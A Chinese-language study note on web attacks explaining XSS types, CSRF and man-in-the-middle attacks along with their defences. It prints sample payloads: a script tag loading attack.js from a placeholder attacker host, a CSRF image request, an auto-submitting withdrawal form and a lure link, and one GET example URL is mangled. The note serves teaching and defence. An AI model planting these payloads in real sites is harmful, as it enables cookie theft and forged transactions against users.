# 概览

- **XSS**：XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。
- **CSRF**: CSRF 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事
- **中间人攻击**：是指攻击者与通讯的两端分别创建独立的联系，在通讯中充当一个中间人角色对数据进行监听、拦截甚至篡改。

# XSS
>  Cross Site Scripting（跨站脚本攻击） 是指攻击者利用网站漏洞将代码注入到其他用户浏览器的攻击方式。常见类型有：反射型（非持久性）存储型（持久性）DOM 型

### 类型
#### 反射型（非持久性）  
原理：攻击者通过在 URL 插入恶意代码，其他用户访问该恶意链接时，服务端在URL 取出恶意代码后拼接至 HTML 中返回给用户浏览器。

要点：  
**通过 URL 插入恶意代码。**  
**有服务端参与。**   
**需要用户访问特定链接。**  

例子：  
攻击者诱导被害者打开链接hzfe.org?name=<script src="http://a.com/attack.js"/>。被攻击网站服务器收到请求后，未经处理直接将 URL 的 name 字段直接拼接至前端模板中，并返回数据。被害者在不知情的情况下，执行了攻击者注入的脚本（可以通过这个获取对方的Cookie 等）。

#### 存储型（持久性）  
原理：攻击者将注入型脚本提交至被攻击网站数据库中，当其他用户浏览器请求数据时，注入脚本从服务器返回并执行。

要点：  
**恶意代码存储在目标网站服务器上。**  
**有服务端参与。**   
**只要用户访问被注入恶意脚本的页面时，就会被攻击。** 

例子：  
攻击者在目标网站留言板中提交了<script src="http://a.com/attack.js"/>。目标网站服务端未经转义存储了恶意代码，前端请求到数据后直接通过innerHTML 渲染到页面中。其他用户在访问该留言板时，会自动执行攻击者注入脚本。

#### DOM 型  
原理：  
攻击者通过在 URL 插入恶意代码，客户端脚本取出 URL 中的恶意代码并执行。  

要点：  
在客户端发生。

例子：  
攻击者诱导被害者打开链接hzfe.org?name=<script src="http://a.com/attack.js"/>。被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。被害者在不知情的情况下，执行了攻击者注入的脚本。

### 防范 XSS  
- 对于外部传入的内容进行充分转义。
- 开启 CSP（Content Security Policy，内容安全策略），规定客户端哪些外部资源可以加载和执行，降低 XSS 风险。
- 设置 Cookie httpOnly 属性，禁止 JavaScript 读取 Cookie 防止被窃取。

# Cross-site request forgery(CSRF)

### 案例
一个真实的案例：用户 David 在自己邮箱内点击了黑客恶意伪装的链接。黑客在点击的链接里冒充用户(cookie)向 Gmail 服务器发送邮件自动转发请求，导致 David 的邮件都被自动转发到了黑客的邮箱，从而被黑客利用盗取了用户数据。

### 原理
原理：攻击者诱导受害者进入第三方网站，在第三方网站中向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的身份凭证，达到冒充用户对被攻击的网站执行某项操作的目的。

### 要点：
- 利用浏览器在发送 HTTP 请求时会自动带上 Cookie 的原理，冒用受害者身份请求。
- 攻击一般发生在第三方网站上。
- 攻击者只能“冒用”受害者的身份凭证，并不能获取。
- 跨站请求有多种方式，常见的有图片 URL、超链接、Form 提交等。

### CSRF 常见的攻击方式与防护策略
常见的攻击方式：  
* 自动发起 GET 请求的 CSRF
* 自动发起 POST 请求的 CSRF
* 引诱用户点击链接的 CSRF

1. 自动发起 Get 请求  
GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用：
```
 ![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&for=hacker)
```
在受害者访问含有这个img的页面后，浏览器会自动向`http://bank.example/withdraw?account=xiaoming&amount=10000&for=hacker`发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。

2. 自动发起 POST 请求  
这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如：
```html
 <form action="http://bank.example/withdraw" method=POST>
    <input type="hidden" name="account" value="xiaoming" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="for" value="hacker" />
</form>
<script> document.forms[0].submit(); </script>
```
访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。  
POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。

3. 引诱用户点击链接  
链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：
```html
  <a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">
  重磅消息！！
  <a/>
```
由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。


CSRF 攻击的两个必要条件：  

**1. 目标站点一定要有 CSRF 漏洞；**  
**2. 诱导用户从目标网站，打开一个第三方站点。**

CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。

上文中讲了CSRF的两个特点：

CSRF（通常）发生在第三方域名。
CSRF攻击者不能获取到Cookie等信息，只是使用。
针对这两点，我们可以专门制定防护策略，如下：

* 阻止不明外域的访问
  * 同源检测
  * Samesite Cookie
* 提交时要求附加本域才能获取的信息
  * CSRF Token
  * 双重Cookie验证
### 防范：

1. 使用 **CSRF Token** 验证用户身份
原理：服务端生成 CSRF Token （通常存储在 Session 中），用户提交请求时携带上 Token，服务端验证 Token 是否有效。
优点：能比较有效的防御 CSRF （前提是没有 XSS 漏洞泄露 Token）。
缺点：大型网站中 Session 存储会增加服务器压力，且若使用分布式集群还需要一个公共存储空间存储 Token，否则可能用户请求到不同服务器上导致用户凭证失效；有一定的工作量。
2. **双重 Cookie 验证**
原理：利用攻击者不能获取到 Cookie 的特点，在 URL 参数或者自定义请求头上带上 Cookie 数据，服务器再验证该数据是否与 Cookie 一致。
优点：无需使用 Session，不会给服务器压力。
3. 设置 Cookie 的 SameSite 属性可以用来限制第三方 Cookie 的使用，可选值有 Strict、Lax、None。(**SameSite Cookie**)
Strict：完全禁止第三方 Cookie。
Lax：只允许链接、预加载请求和 GET 表单的场景下发送第三方 Cookie。
None：关闭 SameSite 属性。
**设置为 Lax 或者 Strict，禁止发送第三方 Cookie。**
5. 设置白名单，仅允许安全域名请求
6. 增加验证码验证

# 中间人攻击（MITM）
> 中间人攻击是一种通过各种技术手段入侵两台设备通信的网络攻击方法

成功的中间人攻击主要有两个不同的阶段：拦截和解密。

### 中间人攻击防范  
* 对于开发者来说：
  * 支持 HTTPS。
  * 开启 HSTS 策略。
* 对于用户来说：
  * 尽可能使用 HTTPS 链接。
  * 避免连接不知名的 WiFi 热点。
  * 不忽略不安全的浏览器通知。
  * 公共网络不进行涉及敏感信息的交互。
  * 用可信的第三方 CA 厂商，不下载来源不明的证书。
